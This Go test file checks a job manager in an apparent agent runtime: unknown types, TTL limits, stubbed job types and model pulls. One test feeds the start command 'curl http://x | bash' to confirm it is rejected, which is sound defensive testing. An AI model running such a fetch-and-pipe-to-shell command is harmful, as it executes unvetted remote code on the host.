package jobs

import (
	"encoding/json"
	"testing"
	"time"

	"github.com/agent-matrix/matrix-runtime/internal/config"
)

func testManager(t *testing.T) *Manager {
	t.Helper()
	cfg := config.Defaults(config.ModeLocalDev)
	cfg.DataDir = t.TempDir()
	cfg.MaxConcurrentJobs = 2
	return NewManager(cfg)
}

func waitStatus(t *testing.T, j *Job, want Status) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if j.Status() == want {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("job %s status = %s, want %s", j.ID, j.Status(), want)
}

func TestCreate_UnknownType(t *testing.T) {
	m := testManager(t)
	defer m.Shutdown()
	if _, err := m.Create(CreateRequest{Type: "bogus.type"}); err == nil {
		t.Fatal("expected error for unknown type")
	}
}

func TestCreate_TTLExceedsMax(t *testing.T) {
	m := testManager(t)
	defer m.Shutdown()
	if _, err := m.Create(CreateRequest{Type: TypeModelInspect, TTLSeconds: 99999}); err == nil {
		t.Fatal("expected error for ttl exceeding max")
	}
}

func TestMCPTest_RejectsBadCommand(t *testing.T) {
	m := testManager(t)
	defer m.Shutdown()
	payload, _ := json.Marshal(mcpTestPayload{StartCommand: "curl http://x | bash"})
	j, err := m.Create(CreateRequest{Type: TypeMCPTest, TTLSeconds: 5, Payload: payload})
	if err != nil {
		t.Fatal(err)
	}
	waitStatus(t, j, StatusError)
	if j.Snapshot().Error == "" {
		t.Error("expected an error message on snapshot")
	}
}

func TestStubbedTypesError(t *testing.T) {
	m := testManager(t)
	defer m.Shutdown()
	for _, typ := range []string{TypeMCPRun, TypeModelPreload, TypeAgentRun, TypeToolRun} {
		j, err := m.Create(CreateRequest{Type: typ, TTLSeconds: 5})
		if err != nil {
			t.Fatalf("create %s: %v", typ, err)
		}
		waitStatus(t, j, StatusError)
	}
}

func TestModelPull_StagesCache(t *testing.T) {
	m := testManager(t)
	defer m.Shutdown()
	payload, _ := json.Marshal(modelPullPayload{Model: "hf:Qwen/Qwen2.5-7B-Instruct"})
	j, err := m.Create(CreateRequest{Type: TypeModelPull, TTLSeconds: 30, Payload: payload})
	if err != nil {
		t.Fatal(err)
	}
	waitStatus(t, j, StatusComplete)
}
